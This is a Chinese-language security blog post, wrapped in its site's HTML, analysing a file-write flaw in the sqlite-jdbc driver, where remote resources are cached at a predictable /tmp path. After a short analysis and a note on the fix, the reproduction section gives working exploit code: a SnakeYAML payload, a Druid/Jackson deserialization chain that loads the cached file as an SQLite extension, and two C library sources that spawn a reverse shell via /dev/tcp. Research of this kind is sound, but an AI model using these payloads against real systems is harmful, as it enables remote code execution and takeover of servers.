@@ -1,0 +1,756 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x01 影响版本3.6.14.1-3.41.2.1 0x02 分析org.sqlite.jdbc4.JDBC4Connection  构造函数的参数，public，然后调用super方法 org.sqlite.SQLiteConnection#SQLiteConnection(java.lang.String, java.lang.String, java.util.Properties)  s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqllitejdbc攻击">
+<meta property="og:url" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="0x01 影响版本3.6.14.1-3.41.2.1 0x02 分析org.sqlite.jdbc4.JDBC4Connection  构造函数的参数，public，然后调用super方法 org.sqlite.SQLiteConnection#SQLiteConnection(java.lang.String, java.lang.String, java.util.Properties)  s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317125634159.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317125739775.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317125903898.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317130556918.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317131247039.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317132251846.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317132301942.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317132730082.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317140659603.png">
+<meta property="og:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250318203033044.png">
+<meta property="article:published_time" content="2025-03-17T04:53:00.000Z">
+<meta property="article:modified_time" content="2025-03-18T12:36:57.268Z">
+<meta property="article:author" content="unam4">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/image-20250317125634159.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>sqllitejdbc攻击 - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sqllitejdbc攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-17 12:53" pubdate>
+          2025年3月17日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          585 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          5 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sqllitejdbc攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h3><p>3.6.14.1-3.41.2.1</p>
+<h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>org.sqlite.jdbc4.JDBC4Connection</p>
+<p><img src="image-20250317125634159.png" srcset="/img/loading.gif" lazyload alt="image-20250317125634159"></p>
+<p>构造函数的参数，public，然后调用super方法</p>
+<p>org.sqlite.SQLiteConnection#SQLiteConnection(java.lang.String, java.lang.String, java.util.Properties)</p>
+<p><img src="image-20250317125739775.png" srcset="/img/loading.gif" lazyload alt="image-20250317125739775"></p>
+<p>super方法会一直调用父类的方法，然后在SQLiteConnection调用open方法。</p>
+<p>org.sqlite.SQLiteConnection#open</p>
+<p><img src="image-20250317125903898.png" srcset="/img/loading.gif" lazyload alt="image-20250317125903898"></p>
+<p>open 方法则会对filename进行判断</p>
+<p>org.sqlite.SQLiteConnection#extractPragmasFromFilename</p>
+<p><img src="image-20250317130556918.png" srcset="/img/loading.gif" lazyload alt="image-20250317130556918"></p>
+<p>这个函数会对jdbcurl进行判断。其中filename就是jdbc:sqlite:后面字符，要是包含?就会走else, 然后用&amp;分割,在按照&#x3D;符号存储keyvaule。</p>
+<p>简单就是<strong>jdbc:sqlite:DBPATH?enable_load_extension&#x3D;true</strong>,先提取<strong>DBPATH?enable_load_extension&#x3D;true</strong>，然后?提取enable_load_extension&#x3D;true,然后&#x3D;分割后，put进Properties。</p>
+<p>继续看</p>
+<p><img src="image-20250317131247039.png" srcset="/img/loading.gif" lazyload alt="image-20250317131247039"></p>
+<p>filename中不满足这几个条件，就会判断是不是:resource:开头，是就是提取:resource:后面的字符，也就是提取协议路径，然后调用classloader读取，读不到就调用new URl 读取。然后传入extractResource。在使用netdoc协议时，由于在这里已经进行了url连接,conntion标识以为true，后续extractResource中连接时，conn.stechaches会报错。</p>
+<p>最重要的就是这个</p>
+<p><strong>org.sqlite.SQLiteConnection#extractResource</strong></p>
+<p><img src="image-20250317132251846.png" srcset="/img/loading.gif" lazyload alt="image-20250317132251846"></p>
+<p>它会判断传入的协议是不是file, 是file就直接retuen，我们要出发漏洞缓存文件，肯定是要走else的</p>
+<p><img src="image-20250317132301942.png" srcset="/img/loading.gif" lazyload alt="image-20250317132301942"></p>
+<p>else就是获取tmp目录，然后然后 **String.format(“sqlite-jdbc-tmp-%d.db”, resourceAddr.hashCode());**这个格式缓存。</p>
+<p>最后就是URLConnection连接后获取输入流，然后内容copy到缓存文件。</p>
+<p>这里使用的resourceAddr.hashCode(), 我们可以直接计算出来，所以这个缓存的文件，我们是可知，也就是我们可以利用jdbc连接或者直接构造函数来写一个文件到tmp目录下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vpsip:port/poc.so&quot;</span>;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> so;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>+<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">URL</span>(url).hashCode()+<span class="hljs-string">&quot;.db&quot;</span>;System.out.printf(filename);&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="0x03-修复"><a href="#0x03-修复" class="headerlink" title="0x03 修复"></a>0x03 修复</h3><p><img src="image-20250317132730082.png" srcset="/img/loading.gif" lazyload alt="image-20250317132730082"></p>
+<p>采取随机,不可控了</p>
+<h4 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h4><p>使用yaml来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    System.setProperty(<span class="hljs-string">&quot;java.io.tmpdir&quot;</span>,<span class="hljs-string">&quot;/tmp&quot;</span>);<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8889/poc1.dylib&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:sqlite::resource:&quot;</span> + so + <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;:resource:&quot;</span> + so + <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(so).hashCode()+<span class="hljs-string">&quot;.db&quot;</span>;<br>    System.out.println(name);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!org.sqlite.jdbc4.JDBC4Connection [ \&quot;&quot;</span>+s+<span class="hljs-string">&quot;\&quot;, \&quot;&quot;</span>+filename+<span class="hljs-string">&quot;\&quot;, !!java.util.Properties []] &quot;</span>;<br>    System.out.println(poc);<br>    yaml.load(poc);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="image-20250317140659603.png" srcset="/img/loading.gif" lazyload alt="image-20250317140659603"></p>
+<p>Sqlite.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sqlite3ext.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br>SQLITE_EXTENSION_INIT1<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN32</span><br>__declspec(dllexport)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Initializes the SQLite extension.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param db SQLite database pointer</span><br><span class="hljs-comment"> * @param pzErrMsg Error message pointer</span><br><span class="hljs-comment"> * @param pApi SQLite API routines pointer</span><br><span class="hljs-comment"> * @return SQLITE_OK on success</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sqlite3_extension_init</span><span class="hljs-params">(</span><br><span class="hljs-params">    sqlite3 *db,</span><br><span class="hljs-params">    <span class="hljs-type">char</span> **pzErrMsg,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> sqlite3_api_routines *pApi</span><br><span class="hljs-params">)</span> &#123;<br>    <span class="hljs-type">int</span> rc = SQLITE_OK;<br>    SQLITE_EXTENSION_INIT2(pApi);<br><br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 父进程继续执行</span><br>        <span class="hljs-comment">// 可以在此处添加额外的代码逻辑</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 父进程持续执行其他任务</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 子进程继续执行</span><br>    umask(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置文件权限掩码</span><br><br>    <span class="hljs-comment">// 创建新会话，并成为会话组组长</span><br>    <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;setsid error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭标准输入、输出、错误输出</span><br>    close(STDIN_FILENO);<br>    close(STDOUT_FILENO);<br>    close(STDERR_FILENO);<br><br>    <span class="hljs-comment">// 打开一个新的文件描述符作为标准输入、输出、错误输出</span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR); <span class="hljs-comment">// 或者使用其他文件路径</span><br>    dup2(fd, STDIN_FILENO);<br>    dup2(fd, STDOUT_FILENO);<br>    dup2(fd, STDERR_FILENO);<br>    close(fd);<br><br>    <span class="hljs-comment">// 执行需要在后台运行的代码</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span>* <span class="hljs-type">const</span>*)args, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>linux.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">void</span> __attribute__ ((constructor)) my_init_so()<br>&#123;<br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 父进程继续执行</span><br>        <span class="hljs-comment">// 可以在此处添加额外的代码逻辑</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 父进程持续执行其他任务</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 子进程继续执行</span><br>    umask(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置文件权限掩码</span><br><br>    <span class="hljs-comment">// 创建新会话，并成为会话组组长</span><br>    <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;setsid error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭标准输入、输出、错误输出</span><br>    close(STDIN_FILENO);<br>    close(STDOUT_FILENO);<br>    close(STDERR_FILENO);<br><br>    <span class="hljs-comment">// 打开一个新的文件描述符作为标准输入、输出、错误输出</span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR); <span class="hljs-comment">// 或者使用其他文件路径</span><br>    dup2(fd, STDIN_FILENO);<br>    dup2(fd, STDOUT_FILENO);<br>    dup2(fd, STDERR_FILENO);<br>    close(fd);<br><br>    <span class="hljs-comment">// 执行需要在后台运行的代码</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span>* <span class="hljs-type">const</span>*)args, <span class="hljs-literal">NULL</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要是jdbc连接</p>
+<p> <strong>jdbc:sqlite:DBPATH?enable_load_extension&#x3D;true</strong>, 开启loadso功能，**SELECT load_extension(‘poc.dylib’)**导入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8889/poc1.dylib&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> so;<br><span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).hashCode()+<span class="hljs-string">&quot;.db&quot;</span>;<br>System.out.printf(filename+<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-type">DruidXADataSource</span> <span class="hljs-variable">druidDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidXADataSource</span>();<br>druidDataSource.setUrl(<span class="hljs-string">&quot;jdbc:sqlite::resource:&quot;</span>+so+<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;?enable_load_extension=true&quot;</span>);<br>druidDataSource.setLogWriter(<span class="hljs-literal">null</span>);<br>druidDataSource.setStatLogger(<span class="hljs-literal">null</span>);<br>druidDataSource.setValidationQuery(<span class="hljs-string">&quot;SELECT load_extension(&#x27;&quot;</span>+filename+<span class="hljs-string">&quot;&#x27;)&quot;</span>);<br>druidDataSource.setInitialSize(<span class="hljs-number">1</span>);<br><br>utils.setFieldValue(druidDataSource,<span class="hljs-string">&quot;transactionHistogram&quot;</span>,<span class="hljs-literal">null</span>);<br>utils.setFieldValue(druidDataSource,<span class="hljs-string">&quot;initedLatch&quot;</span>,<span class="hljs-literal">null</span>);<br><br><span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(druidDataSource);<br><span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> utils.maskmapToString(jsonNodes, jsonNodes);<br><span class="hljs-type">byte</span>[] serialize = utils.serialize(hashMap);<br>utils.unserialize(serialize);<br></code></pre></td></tr></table></figure>
+
+<p><img src="image-20250318203033044.png" srcset="/img/loading.gif" lazyload alt="image-20250318203033044"></p>
